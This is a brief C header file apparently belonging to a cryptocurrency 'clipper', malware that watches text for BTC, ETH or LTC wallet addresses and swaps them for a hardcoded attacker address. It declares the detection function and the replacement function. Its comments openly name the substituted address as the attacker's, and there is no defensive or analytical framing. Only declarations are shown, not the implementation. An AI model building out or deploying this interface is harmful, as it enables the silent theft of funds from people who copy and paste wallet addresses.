#ifndef CLIPPER_H
#define CLIPPER_H

#include <stddef.h>

// Check if text contains a crypto address (BTC/ETH/LTC)
// Returns: 0=no match, 1=BTC, 2=ETH, 3=LTC
int clipper_detect_address(const char *text);

// Generate a hardcoded attacker address for each type
// Returns 0 on success
int clipper_get_replacement(int type, char *buf, size_t buf_len);

#endif
